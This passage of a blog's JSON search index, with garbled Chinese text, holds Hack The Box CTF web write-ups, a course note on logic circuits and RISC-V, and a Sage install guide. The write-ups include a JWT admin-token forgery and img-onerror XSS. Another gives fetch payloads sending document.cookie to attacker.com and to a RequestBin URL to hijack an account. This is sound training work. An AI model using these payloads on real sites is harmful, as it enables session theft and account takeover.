&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0XzE3ODgiLCJpYXQiOjE3NDM2MDk3MDd9.RrHUnCE8lcYjM0m2LZQDYM46uqrberxslMW_FNtm49s&quot;secret = &quot;halloween-secret&quot;algorithm = &quot;HS256&quot;decoded_payload = jwt.decode(original_token, secret, algorithms=[algorithm])decoded_payload[&quot;username&quot;] = &quot;admin&quot;new_token = jwt.encode(decoded_payload, secret, algorithm=algorithm)print(&quot;\\næ–°çš„ Token:&quot;)print(new_token) å¾—åˆ°flagï¼šHTB{k33p_th3s3_jwt_s3cr3t_s4f3f_br0} ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"JWT","slug":"JWT","permalink":"https://archer-baiyi.github.io/tags/JWT/"}]},{"title":"HTB Phantom Script Writeup","slug":"CTF/Web/HTB-Phantom-Script-Writeup","date":"2025-04-02T11:56:01.000Z","updated":"2025-04-02T21:32:11.467Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-Phantom-Script-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/02/CTF/Web/HTB-Phantom-Script-Writeup/","excerpt":"","text":"é¢˜ç›®æè¿° ï¼ˆæœ‰é™„ä»¶ï¼Œä½†å®Œå…¨ä¸éœ€è¦ã€‚ï¼‰ è§‚å¯Ÿæ‰“å¼€ç½‘é¡µï¼š æ³¨æ„å³è¾¹çš„è¿™æ®µä»£ç ï¼š 123456789101112searchInput.addEventListener(&#x27;input&#x27;, function () &#123; const query = searchInput.value; if (query.trim() !== &quot;&quot;) &#123; const filteredArticles = filterArticles(query); searchResultsHeading.innerHTML = `Results for: &quot;$&#123;query&#125;&quot;`; searchResultsHeading.style.display = &#x27;block&#x27;; renderArticles(filteredArticles); &#125; else &#123; searchResultsHeading.style.display = &#x27;none&#x27;; renderArticles(articles); &#125;&#125;); è¿™é‡Œä¼šç›´æ¥æå–æˆ‘ä»¬çš„è¾“å…¥èµ‹å€¼ç»™ queryï¼Œå¹¶ä¸”å°†queryç›´æ¥æ‹¼æ¥è¿›HTMLçš„ä»£ç é‡Œäº†ã€‚ ç½‘é¡µå³ä¸‹è§’é‚£é‡Œè¿˜ç»™äº†äº›åŸºç¡€xssçš„ä¾‹å­ï¼š ä½†æ˜¯å°è¯• 1&lt;script&gt;alert(&#x27;Boo!&#x27;);&lt;/script&gt; ä¼šå¤±è´¥ï¼Œæœ‰å¯èƒ½æ˜¯é‚£é‡Œè‡ªåŠ¨è¿‡æ»¤äº†ã€‚ æ¸—é€å°è¯•å…¶ä»–Payloadå³å¯ï¼š 1&lt;img src=x onerror=&quot;alert(&#x27;Boo!&#x27;)&quot;&gt; æ£€æµ‹åˆ°æ³¨å…¥æˆåŠŸäº†ä¾¿ä¼šè‡ªåŠ¨æ˜¾ç¤ºflagã€‚ å¾—åˆ°flagï¼šHTB{xS5_iS_34SY_wh4t_d0_you_th1nk?} ã€‚ è®²ä¸€ä¸‹è¿™é‡Œæ³¨å…¥æˆåŠŸçš„åŸç†ï¼š è¿™æ˜¯æˆ‘ä»¬æ³¨å…¥çš„å†…å®¹ï¼š 1&lt;img src=x onerror=&quot;alert(&#x27;Boo!&#x27;)&quot;&gt; å½“æˆ‘ä»¬åœ¨htmlé‡Œå†™ 1&lt;img src=&quot;valid_image.jpg&quot;&gt; çš„æ—¶å€™æµè§ˆå™¨ä¼šè‡ªåŠ¨å»åŠ è½½å›¾ç‰‡ã€‚ä½†æ˜¯æˆ‘ä»¬è¿™é‡Œæ•…æ„å†™äº†ä¸ªæ— æ•ˆçš„åœ°å€1&lt;img src=x&gt; æ‰€ä»¥åŠ è½½æ—¶ä¼šè§¦å‘errorï¼Œç„¶å onerror é‡Œçš„å†…å®¹ä¼šè¢«å½“ä½œ JavaScript æ‰§è¡Œã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"æ³¨å…¥","slug":"æ³¨å…¥","permalink":"https://archer-baiyi.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/tags/JavaScript/"}]},{"title":"HTB OnlyHacks Writeup","slug":"CTF/Web/HTB-OnlyHacks-Writeup","date":"2025-04-02T07:38:35.000Z","updated":"2025-04-02T21:32:07.040Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-OnlyHacks-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/02/CTF/Web/HTB-OnlyHacks-Writeup/","excerpt":"","text":"é¢˜ç›®æè¿° ï¼ˆæ— é™„ä»¶ï¼‰ è§‚å¯Ÿæ‰“å¼€ç½‘é¡µï¼š æ³¨å†Œä¸ªè´¦å·è¯•è¯•ï¼šï¼ˆæ³¨æ„è¿™é‡Œä¸€å®šè¦ä¸Šä¼ ä¸€ä¸ªå¤´åƒï¼Œä¸ç„¶ä¼šä¸€ç›´æç¤ºç”¨æˆ·åé‡å¤ï¼‰ è¿›å»ä¹‹åä¼šæ˜¾ç¤º4ä¸ªäººï¼Œæˆ‘ä»¬æ¯ä¸ªéƒ½ç‚¹ä¸€ä¸‹ç»¿è‰²çš„å¿ƒï¼ˆåœ¨dating appé‡Œåº”è¯¥æ˜¯å¿ƒåŠ¨çš„æ„æ€ï¼‰ï¼š ç„¶åç‚¹è¿›å³ä¸Šè§’çš„Mathcesï¼š ä¼šå‘ç°åªæœ‰ä¸€ä¸ªå¯¹è¯æ¡†ã€‚ å¯¹è¯é‡Œæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æˆ‘ä»¬æ³¨æ„åˆ°å®ƒå¥½åƒæ˜¯æ¯éš”ä¸€æ®µæ—¶é—´ï¼ˆå¤§æ¦‚5åˆ°10ç§’å·¦å³ï¼‰æ‰ä¼šçœ‹ä¸€æ¬¡æˆ‘ä»¬çš„æ¶ˆæ¯å¹¶å›å¤ï¼Œè·Ÿä¸€èˆ¬XSSçš„ç¯å¢ƒå¾ˆåƒã€‚ æˆ‘ä»¬æŸ¥çœ‹å½“å‰çš„cookieä¼šå‘ç°ï¼š é€šè¿‡base64è§£ç ä¼šå‘ç°è¿™ä¸ªåº”è¯¥æ˜¯é€šè¿‡cookieè¯†åˆ«æˆ‘ä»¬ç™»å½•çš„èº«ä»½çš„ã€‚ï¼ˆåé¢çš„ä¹±ç éƒ¨åˆ†æ˜¯pythonçš„flaskçš„sessionè‡ªå¸¦çš„ç­¾åï¼‰ æ¸—é€é€šè¿‡XSSè·å–ç®¡ç†å‘˜èº«ä»½å¹¶ç™»å½•ä»–çš„è´¦å·ã€‚ é¦–å…ˆåœ¨ https://requestbin.kanbanbox.com/ ä¸Šåˆ›å»ºä¸€ä¸ªRequestBinï¼š æ­£å¸¸XSSæ”»å‡»çš„æ¨¡æ¿æ˜¯ï¼š 1&lt;script&gt;fetch(&quot;http://attacker.com?cookie=&quot; + document.cookie); &lt;/script&gt; æ‰€ä»¥æˆ‘ä»¬å°†æˆ‘ä»¬åœ¨RequestBinåˆ›å»ºçš„urlæ”¾è¿›å»ç„¶ååœ¨èŠå¤©æ¡†å‘é€ï¼š 1&lt;script&gt;fetch(&quot;https://requestbin.kanbanbox.com/xckrydxc?cookie=&quot; + document.cookie); &lt;/script&gt; ä¹‹ååœ¨RequestBiné¡µé¢ç‚¹å‡»å³ä¸Šè§’çš„é’è‰²å›¾æ ‡é‚£é‡Œï¼š å°±å¯ä»¥æŸ¥çœ‹æ”¶åˆ°çš„cookieå†…å®¹ï¼š 1eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6IlJlbmF0YSJ9fQ.Z-0WhA.5nThwcWkf-HP8ql-gF68E3RTUjE ä¹‹ååœ¨æµè§ˆå™¨é‡Œä¿®æ”¹æˆ‘ä»¬çš„cookieå†åˆ·æ–°ç½‘é¡µï¼š å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸç™»å½•äº†å¥¹çš„è´¦å·ï¼Œè¿˜èƒ½çœ‹åˆ°æˆ‘ä»¬åˆšæ‰å‘é€çš„æ¶ˆæ¯ã€‚ flagå°±åœ¨å¦ä¸€ä¸ªå¯¹è¯é‡Œï¼šHTB{d0nt_trust_str4ng3r5_bl1ndly} ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"XSS","slug":"XSS","permalink":"https://archer-baiyi.github.io/tags/XSS/"}]},{"title":"é€»è¾‘ç”µè·¯å›¾","slug":"TUM info ç¬”è®°/ERA/é€»è¾‘ç”µè·¯å›¾","date":"2025-03-31T20:35:54.000Z","updated":"2025-04-26T18:30:34.156Z","comments":true,"path":"2025/03/31/TUM info ç¬”è®°/ERA/é€»è¾‘ç”µè·¯å›¾/","permalink":"https://archer-baiyi.github.io/2025/03/31/TUM%20info%20%E7%AC%94%E8%AE%B0/ERA/%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9B%BE/","excerpt":"","text":"é€»è¾‘é—¨å…ˆæ¥è®¤è¯†ï¼ˆè®°ï¼‰ä¸€ä¸‹åŸºç¡€çš„é€»è¾‘é—¨ï¼š æ³¨æ„ï¼ŒNANDï¼ŒNORé‚£é‡Œçš„é‚£ä¸ªå°åœ†åœˆä»£è¡¨çš„æ˜¯å–åï¼ˆnegationï¼‰ï¼Œè·Ÿæœ€åº•ä¸‹çš„Negationæ˜¯ä¸€ä¸ªæ•ˆæœã€‚ æ¯”å¦‚è¿™é‡Œè¡¨è¾¾çš„æ˜¯ $y = \\neg (a \\wedge \\neg b) $ ï¼š ä¸€èˆ¬æƒ…å†µä¸‹å µåœ¨é€»è¾‘é—¨å‡ºå…¥å£çš„åœ†åœˆæŒ‡çš„æ˜¯å–åï¼Œè€Œä¸‹é¢è¿™ç§åªæ˜¯è¡¨ç¤ºçº¿è·¯è¿æ¥è€Œå·²ï¼š ä¸è¦å¼„æ··äº†ã€‚ åŠ æ³•ï¼ˆAdditionï¼‰åŠåŠ å™¨ï¼ˆDer Halbaddierer ï¼ŒHAï¼‰åŠåŠ å™¨çš„ç›®çš„æ˜¯è®¡ç®—2ä¸ªbitçš„åŠ æ³•ï¼Œè¾“å‡ºä¹Ÿä¸º2ä¸ªbitï¼Œå³ï¼š 1234 a0+ b0------s1 s0 ä¹Ÿå¯ä»¥ç”¨æ•°å­¦å…¬å¼è¡¨è¾¾ï¼š \\begin{align*} ha: B^2 &\\to B^2 \\\\ (a_0,b_0) &\\mapsto (s_1,s_0)\\\\ \\text{mit } 2s_1+s_0 &= a_0+b_0 \\end{align*}å¯¹åº”çš„çœŸå€¼è¡¨åˆ™æ˜¯ï¼š \\begin{array}{cc|cc} a_0 & b_0 & s_1 & s_0 \\\\ \\hline 0 & 0 & 0 & 0 \\\\ 0 & 1 & 0 & 1 \\\\ 1 & 0 & 0 & 1 \\\\ 1 & 1 & 1 & 0 \\\\ \\end{array}ä¹Ÿå°±æ˜¯è¯´ s_0 = a_0 \\text{ xor } b_0 s_1 = a_0 \\wedge b_0å¯¹åº”çš„é€»è¾‘ç”µè·¯å›¾ï¼š å·¦è¾¹æ˜¯andï¼Œå³è¾¹æ˜¯xorã€‚åœ¨ä¹‹åçš„å†…å®¹é‡Œç”¨HAæŒ‡ä»£åŠåŠ å™¨ã€‚ Kostenå’ŒTiefeåˆ†åˆ«æ˜¯ï¼šC(HA) = 2, Depth(HA) = 1ã€‚ å…¨åŠ å™¨ï¼ˆDer Volladdierer ï¼ŒFAï¼‰å…¨åŠ å™¨çš„ç›®çš„æ˜¯è®¡ç®—3ä¸ªbitçš„åŠ æ³•ï¼Œè¾“å‡ºä¸º2ä¸ªbitï¼Œå³ï¼š 12345 a0+ b0+ c------s1 s0 å…¶ä¸­cæ˜¯è¿›ä½ä¿¡æ¯ã€‚ å¯¹åº”çš„æ•°å­¦è¡¨è¾¾ï¼š \\begin{align*} fa: B^3 &\\to B^2 \\\\ (a_0,b_0,c) &\\mapsto (s_1,s_0)\\\\ \\text{mit } 2s_1+s_0 &= a_0+b_0+c \\end{align*}çœŸå€¼è¡¨ï¼š \\begin{array}{ccc|cc} a_0 & b_0 & c & fa_1 & fa_0 \\\\ \\hline 0 & 0 & 0 & 0 & 0 \\\\ 0 & 0 & 1 & 0 & 1 \\\\ 0 & 1 & 0 & 0 & 1 \\\\ 0 & 1 & 1 & 1 & 0 \\\\ 1 & 0 & 0 & 0 & 1 \\\\ 1 & 0 & 1 & 1 & 0 \\\\ 1 & 1 & 0 & 1 & 0 \\\\ 1 & 1 & 1 & 1 & 1 \\\\ \\end{array}æ³¨æ„åˆ°ï¼š s_0 = a_0 \\text{ xor } b_0 \\text{ xor } c = ha_0(c,ha_0(a_0,b_0))\\\\ \\begin{align*} s_1 &= a_0 \\wedge b_0 \\vee c \\wedge (a_0 \\text{ xor } b_0 )\\\\ &= ha_1(a_0,b_0) + ha_1(c,ha_0(a_0,b_0)) \\end{align*}ï¼ˆha0è¡¨ç¤º2ä¸ªæ•°ç›¸åŠ å¾—åˆ°çš„s0ä½çš„å€¼ï¼Œha1åŒç†ã€‚ï¼‰ é€»è¾‘ç”µè·¯å›¾ï¼š Kostenå’ŒTiefeåˆ†åˆ«æ˜¯ï¼šC(HA) = 5, Depth(HA) = 3ã€‚ é€‰æ‹©å™¨ï¼ˆMultiplexerï¼ŒMUXï¼‰é€‰æ‹©å™¨æ­£å¦‚å­—é¢æ„æ€ï¼Œä¼šä»2ä¸ªæ•°é‡Œé€‰æ‹©ä¸€ä¸ªæ•°ã€‚æ•°å­¦è¡¨è¾¾ï¼š \\begin{align*}sel_n: B^{2n+} &\\to B^{n} \\\\ (a_{n-1}, \\ldots, a_0, b_{n-1}, \\ldots, b_0, s) &\\mapsto \\begin{cases} (a_{n-1} \\ldots a_0), & \\text{falls } s = 1 \\\\ (b_{n-1} \\ldots b_0), & \\text{falls } s = 0 \\end{cases} \\end{align*}æ³¨æ„åˆ°ï¼š (sel_n)_i = (s \\wedge a_i) \\vee (\\neg s \\wedge b_i)é€»è¾‘ç”µè·¯å›¾ï¼š åç»­ä¸€èˆ¬ç”¨è¿™ä¸ªç¬¦å·æŒ‡ä»£ï¼š å­˜å‚¨ï¼ˆSpeichernï¼‰RS-Latch / RS-FlipFlop çœŸå€¼è¡¨ï¼š \\begin{array}{cc|cc} R & S & Q(t) & \\neg Q(t) \\\\ \\hline 0 & 0 & Q(t) & \\neg Q(t) \\\\ 0 & 1 & 1 & 0 \\\\ 1 & 0 & 0 & 1 \\\\ 1 & 1 & 0 & 0 \\\\ \\end{array}D-Latch / D-FlipFlop ï¼ˆè®¾ä¸Šé¢ and çš„ç»“æœä¸ºSï¼Œä¸‹é¢ and çš„ç»“æœä¸ºRï¼Œè·ŸRS-Latchçš„ä½ç½®ä¸€æ ·ã€‚ï¼‰ çœŸå€¼è¡¨ï¼š \\begin{array}{cc|cc|cc} D & E & Q(t) & \\neg Q(t) & R & S\\\\ \\hline 0 & 0 & Q(t) & \\neg Q(t) & 0 & 0\\\\ 1 & 0 & Q(t) & \\neg Q(t) & 0 & 0\\\\ 0 & 1 & 0 & 1 & 1 & 0\\\\ 1 & 1 & 1 & 0 & 0 & 1\\\\ \\end{array}2*2 Bit Speicher ï¼ˆwriteä½ç­‰äº0ä»£è¡¨è¯»ï¼Œç­‰äº1ä»£è¡¨å†™ï¼›ç°è‰²çš„æ˜¯é€‰æ‹©å™¨ï¼›ä¸Šé¢çš„2ä¸ªé»„è‰²éƒ¨åˆ†æ˜¯Adresse=0çš„ç»“æœï¼Œä¸‹é¢çš„æ˜¯Adresse=1çš„ã€‚ï¼‰ Inkrementerè‡ªå¢å™¨ä¸»è¦ç”¨äºæ¯”å¦‚è¯´æ›´æ–°ç¨‹åºè®¡æ•°å™¨ï¼ˆProgram counterï¼‰ï¼Œéœ€è¦åˆ°è¾¾çš„æ•ˆæœç±»ä¼¼ï¼š 1add pc, pc, 4 éœ€è¦2ä¸ªæ­¥éª¤ï¼Œè®¡ç®—åŠ æ³•å¹¶ä¸”å­˜å‚¨ç»“æœã€‚æ‰€ä»¥å¯¹åº”çš„é€»è¾‘ç”µè·¯ä¸ºï¼š RISC-V Single-Cycle Prozessorå…ˆè§£é‡Šä¸€ä¸‹æ‰€æœ‰éœ€è¦çš„éƒ¨ä»¶ï¼š Program Counter (PC)ï¼š Instruktionsspeicherï¼šå­˜å‚¨æ‰€æœ‰éœ€è¦æ‰§è¡Œçš„æŒ‡ä»¤ Registerbankï¼š ä¼šå¤„ç†æ‰€æœ‰çš„å¯„å­˜å™¨ã€‚å…¶ä¸­A1ï¼ŒA2æ˜¯æ“ä½œé‡Œçš„å¯„å­˜å™¨çš„åœ°å€ï¼ŒRD1å’ŒRD2æ˜¯è¿™ä¸¤ä¸ªå¯„å­˜å™¨é‡Œçš„å…·ä½“å†…å®¹ã€‚A3å’ŒWD3æ˜¯ç¬¬3ä¸ªå¯„å­˜å™¨ï¼ˆå­˜å‚¨è®¡ç®—ç»“æœçš„ï¼‰ã€‚åªæœ‰å½“WE3=1çš„æ—¶å€™æ‰ä¼šå†™å…¥ç¬¬ä¸‰ä¸ªå¯„å­˜å™¨ã€‚ Arithmetic Logic Unit (ALU)ï¼š è¯¦ç»†ç‰ˆï¼š ALUä¼šè¿›è¡Œæ‰€æœ‰çš„é€»è¾‘è¿ç®—ã€‚ALUControlè¿™ä¸ªå‚æ•°ä¼šæŒ‡å®šæ‰§è¡Œå…·ä½“å“ªé¡¹æ“ä½œï¼ˆå¦‚ADD, AND, SUB ç­‰ï¼Œä»¥3 bitçš„æ ¼å¼ï¼‰ã€‚æ³¨æ„ï¼Œæœ€åä¸€ä¸ªbitçš„å†…å®¹ï¼ˆå³ $\\text{ALUControl}_0$ï¼‰ä¼šä¼ é€’ç»™ä¸Šé¢çš„Sumä»¥åŠSumä¸Šé¢çš„é‚£ä¸ªMUXã€‚ æ¯”å¦‚ï¼š 000è¡¨ç¤ºåŠ æ³•ï¼› 001è¡¨ç¤ºå‡æ³• 010è¡¨ç¤ºANDï¼› 011è¡¨ç¤ºORï¼› 101è¡¨ç¤ºè¿›è¡Œæ˜¯å¦ç­‰äº0çš„åˆ¤æ–­ã€‚ Datenspeicherï¼š CLKè¡¨ç¤ºç³»ç»Ÿå†…çš„è®¡æ—¶å™¨ã€‚A æ˜¯éœ€è¦è¯»å–æˆ–è€…åŠ è½½çš„åœ°å€ã€‚RDæ˜¯è¯»å–åˆ°çš„ä¿¡æ¯ï¼ˆRead Dataï¼‰ï¼ŒWDæ˜¯éœ€è¦å†™å…¥çš„ä¿¡æ¯ï¼ˆWrite Dataï¼‰ã€‚åªæœ‰å½“WE=1çš„æ—¶å€™æ‰ä¼šå†™å…¥ã€‚ å®Œæ•´çš„RISC-V Single-Cycle Prozessorçš„ç»“æ„ï¼š è§£é‡Šä¸€ä¸‹æ¯ä¸ªå‚æ•°ï¼š PCSrcï¼šå†³å®šå½“å‰åœ°å€ï¼Œæ˜¯ç»§ç»­ä¸‹å»è¿˜æ˜¯å›åˆ°è¿”å›åœ°å€ã€‚ 0è¡¨ç¤ºå›åˆ°ä¹‹å‰çš„åœ°å€ç»§ç»­ 1è¡¨ç¤ºåœ¨ç°åœ¨çš„åœ°å€åŸºç¡€ä¸Šç»§ç»­ã€‚ ResultSrcï¼šå†³å®šå½“å‰è¾“å‡ºã€‚ å¦‚æœæ˜¯lwä¹‹ç±»çš„æ“ä½œï¼Œéœ€è¦è®¾ä¸º01ï¼Œå› ä¸ºéœ€è¦å°†è¯»å–åˆ°çš„ä¿¡æ¯å­˜å…¥ç»“æœå¯„å­˜å™¨ï¼ˆRD -&gt; WD3ï¼‰ã€‚ å¦‚æœæ˜¯R-Typeä¹‹ç±»çš„æ“ä½œï¼Œåˆ™éœ€è¦è®¾ä¸º00ã€‚ MemWriteï¼šå†³å®šå½“å‰æ˜¯å¦è¦å†™å…¥åˆ°Memoryä¸­ã€‚ 0è¡¨ç¤ºä¸å†™å…¥ï¼› 1è¡¨ç¤ºå†™å…¥ã€‚ ALUControlï¼šå†³å®šå½“å‰çš„ALUæ“ä½œ add, and, sub ä¹‹ç±»çš„R-Typeæ“ä½œç›´æ¥è®¾ä¸ºæ“ä½œæœ¬èº«å°±å¥½ï¼ˆä»¥3 bitçš„æ ¼å¼ï¼‰ï¼› lw, swéœ€è¦è®¾ä¸ºaddï¼Œå› ä¸ºéœ€è¦é€šè¿‡åŠ æ³•è®¡ç®—åœ°å€ï¼› beqç­‰éœ€è¦è®¾ä¸ºsubï¼Œå› ä¸ºè¿™é‡Œåˆ¤æ–­aå’Œbæ˜¯å¦ç›¸ç­‰æ˜¯é€šè¿‡ç›´æ¥ä¼ é€’a-bçš„è®¡ç®—ç»“æœå®ç°çš„ã€‚ ALUSrcï¼šå†³å®šå½“å‰æ˜¯ä½¿ç”¨çš„ç¬¬äºŒä¸ªå¯„å­˜å™¨è¿˜æ˜¯ç«‹å³æ•°ï¼ˆimmï¼‰ã€‚ 0è¡¨ç¤ºä½¿ç”¨ç¬¬äºŒä¸ªå¯„å­˜å™¨çš„å†…å®¹ï¼› 1è¡¨ç¤ºä½¿ç”¨immã€‚ ImmSrcï¼šå†³å®šå½“å‰è¯»å–immçš„æ ¼å¼ï¼Œå› ä¸ºæ¯ç§Typeçš„æŒ‡ä»¤å­˜å‚¨immçš„æ ¼å¼éƒ½ä¸ä¸€æ ·ã€‚ RegWriteï¼šå†³å®šå½“å‰ç»“æœæ˜¯å¦éœ€è¦å†™å…¥ç¬¬3ä¸ªå¯„å­˜å™¨ã€‚ 0è¡¨ç¤ºä¸å†™å…¥ï¼› 1è¡¨ç¤ºå†™å…¥ã€‚ ControlUnitçš„éƒ¨åˆ†æ„é€ ç¨å¾®å†å…·ä½“ä¸€ç‚¹æ˜¯è¿™æ ·çš„ï¼š ä¸€äº›å¸¸è§æ“ä½œçš„å‚æ•°ä¾‹å­ï¼š xè¡¨ç¤ºä¸é‡è¦ã€‚æ¯”å¦‚è¯´åœ¨ jal é‚£é‡Œï¼Œjump çš„å‚æ•°ä¼šè¢«è®¾ä¸º1ï¼Œè¿™ä¸ª1ä¼šå’Œ (zero AND Branch) è¿›è¡Œ or æ“ä½œï¼Œæ‰€ä»¥ç»“æœä¸€å®šæ˜¯1ï¼Œä¹Ÿå°±æ„å‘³ç€ Branchçš„ç»“æœåœ¨è¿™ä¸ªæƒ…å†µä¸‹æ— å…³ç´§è¦ã€‚ RISC-V Multicycle Prozessor åªç”¨äº†ä¸€ä¸ªç¡¬ä»¶å­˜å‚¨æŒ‡ä»¤ä»¥åŠæ•°æ®ï¼Œå¹¶ä¸”åŠ äº†å¾ˆå¤šä¸ªCLKï¼Œå°†æ•´ä¸ªæµç¨‹æ‹†æˆäº†å¾ˆå¤šæ­¥ã€‚ åœ¨Singlecycleé‡Œï¼Œtaktçš„æ—¶é—´éœ€è¦è€ƒè™‘æœ€å¤æ‚çš„æŒ‡ä»¤æ‰§è¡Œæ‰€éœ€è¦çš„æ—¶é—´ï¼Œæ¯”å¦‚è¯´loadä¹‹ç±»çš„æ“ä½œæ¯”å…¶ä»–çš„æ“ä½œè¦ä¹…å¾ˆå¤šï¼Œæ‰€ä»¥æ•´ä½“çœ‹ä¸‹æ¥å¾ˆäºï¼Œå› ä¸ºéœ€è¦å°†å°±è¿™ç§æ“ä½œã€‚ ä½†åœ¨Multicycleé‡Œï¼Œä¼šå°†æ¯ä¸ªæ“ä½œæ‹†æˆå¥½å¤šæ­¥ï¼Œtaktçš„æ—¶é—´åªéœ€è¦è®¾ç½®æˆè¿™äº›æ­¥éª¤ä¸­æœ€é•¿çš„æ—¶é—´å³å¯ã€‚","categories":[{"name":"TUM info è¯¾ç¨‹ç¬”è®°","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA è®¡ç®—æœºä½“ç³»ç»“æ„","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/ERA-è®¡ç®—æœºä½“ç³»ç»“æ„","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/tags/Rechnerarchitektur/"},{"name":"è®¡ç®—æœºä½“ç³»ç»“æ„","slug":"è®¡ç®—æœºä½“ç³»ç»“æ„","permalink":"https://archer-baiyi.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"é€»è¾‘ç”µè·¯å›¾","slug":"é€»è¾‘ç”µè·¯å›¾","permalink":"https://archer-baiyi.github.io/tags/%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9B%BE/"},{"name":"é€»è¾‘é—¨","slug":"é€»è¾‘é—¨","permalink":"https://archer-baiyi.github.io/tags/%E9%80%BB%E8%BE%91%E9%97%A8/"}]},{"title":"å¦‚ä½•åœ¨Kali Linuxé‡Œå®‰è£…sage","slug":"CTF/Crypto/å¦‚ä½•åœ¨Linux_wslé‡Œå®‰è£…sage","date":"2025-03-31T12:44:34.000Z","updated":"2025-07-02T20:06:28.395Z","comments":true,"path":"2025/03/31/CTF/Crypto/å¦‚ä½•åœ¨Linux_wslé‡Œå®‰è£…sage/","permalink":"https://archer-baiyi.github.io/2025/03/31/CTF/Crypto/%E5%A6%82%E4%BD%95%E5%9C%A8Linux_wsl%E9%87%8C%E5%AE%89%E8%A3%85sage/","excerpt":"","text":"è¿™é‡Œä¸»è¦ä»‹ç»2ç§æ–¹æ³•ã€‚ç¬¬ä¸€ç§æ–¹æ³•å®‰è£…çš„sageçš„ç‰ˆæœ¬ä¼šç›¸å¯¹æ—§ä¸€äº›ï¼Œä½†æ˜¯æ•´ä½“çš„å®‰è£…æµç¨‹éå¸¸å¿«é€Ÿã€‚è€Œç¬¬äºŒç§æ–¹æ³•å®‰è£…çš„æ˜¯æœ€æ–°ç‰ˆçš„sageï¼ŒåŠŸèƒ½ä¼šç›¸å¯¹å¤šå¾ˆå¤šï¼ˆå°¤å…¶æ˜¯æŸäº›Latticeç›¸å…³çš„åŠŸèƒ½ï¼‰ï¼Œåªä¸è¿‡æ•´ä½“æµç¨‹ä¼šå¾ˆé•¿ã€‚ ä½¿ç”¨Miniforgeå®‰è£…sageæ³¨æ„ï¼Œè¿™ä¸ªæ–¹æ³•å®‰è£…çš„sageçš„ç‰ˆæœ¬ä¼šç›¸å¯¹æ—§ä¸€äº›ï¼Œä½†æ˜¯æ•´ä½“çš„å®‰è£…æµç¨‹éå¸¸å¿«é€Ÿï¼Œä¸€èˆ¬10åˆ†é’Ÿå†…å°±å¯ä»¥å®Œæˆã€‚ ä¸€å…±åˆ†æˆ2ä¸ªæ­¥éª¤ï¼š å®‰è£…Miniforgeï¼ˆAnacondaçš„è½»é‡åŒ–æ›¿ä»£å“ï¼‰ ä½¿ç”¨condaå®‰è£…sage ä¸‹è½½vscodeçš„wslç‰ˆï¼ˆå¯é€‰ï¼‰ å®‰è£…Miniforge1wget https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-Linux-x86_64.sh ç„¶åå®‰è£…è„šæœ¬ï¼š 1bash Miniforge3-Linux-x86_64.sh å¦‚æœå®‰è£…æ—¶è¯¢é—®ä½ æ˜¯å¦è¦æŠŠå®ƒåŠ å…¥ .bashrc ï¼Œ é€‰æ‹©æ˜¯ï¼Œè¿™æ ·ä¸€æ¥æ¯æ¬¡æ‰“å¼€wslå®ƒéƒ½ä¼šè‡ªåŠ¨å¯åŠ¨å¹¶è¿›å…¥baseç¯å¢ƒï¼Œä¼šæ¯”è¾ƒæ–¹ä¾¿ã€‚ å½“ç„¶å¦‚æœè¿™ä¸ªè‡ªå¯æ²¡æœ‰è®¾ç½®æˆåŠŸï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨è®¾ç½®ï¼š å…ˆæ‰“å¼€.bashrc ç¼–è¾‘å™¨ 1nano ~/.bashrc åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ 